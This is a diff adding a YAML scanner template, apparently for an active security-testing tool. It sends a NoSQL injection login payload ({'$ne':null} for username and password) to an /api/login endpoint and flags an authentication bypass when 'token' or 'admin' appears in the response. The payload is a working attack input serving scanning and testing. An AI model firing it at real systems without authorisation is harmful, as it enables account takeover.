@@ -1,0 +1,24 @@
+id: patt-nosql-regex-01-login
+name: 'PATT NoSQL patt-nosql-regex-01'
+severity: high
+type: active
+tags:
+  - nosql
+  - patt
+  - injection
+  - api
+requires:
+  - node
+description: 'PATT NoSQL $regex brute 1 char (iterasikan .{1} -> m.* -> md.*). [patt:patt-nosql-regex-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/README.md]'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"username":{"$ne":null},"password":{"$ne":null}}'
+    sendHeaders:
+      Content-Type: 'application/json'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'token'
+          - 'admin'
